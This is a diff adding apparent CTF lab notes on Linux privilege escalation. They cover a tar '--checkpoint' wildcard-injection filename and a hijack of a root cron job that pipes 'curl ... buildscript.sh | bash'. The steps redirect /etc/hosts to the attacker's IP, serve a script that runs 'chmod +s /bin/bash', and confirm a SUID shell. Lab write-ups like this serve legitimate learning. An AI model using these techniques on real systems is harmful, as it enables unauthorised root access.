@@ -39,6 +39,32 @@ tar cf /home/milesdyson/backups/backup.tgz *
 
 when you remove 
 #rm -rf /var/www/html/--checkpoint=1
+____________________________________________________________________________________________________________________________
+
+# Update builds from latest code
+* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
+
+/etc/host file is writeable so set our ip with overpass.thm(domain)
+10.4.52.17 overpass.thm
+
+#ping overpass.thm (it is reachable)
+
+Create a folder like in crontab
+#mkdir -p www/downloads/src
+#subl buildscript.sh
+
+#!/bin/bash
+chmod +s /bin/bash
+
+Return back to www directory
+victor@kali:/www$ sudo python3 -m http.server 80
+
+in victim machine
+------------------
+#watch ls -al /bin/bash (bash file changes into suid file after connected to attacker server)
+
+
+
 
 
 
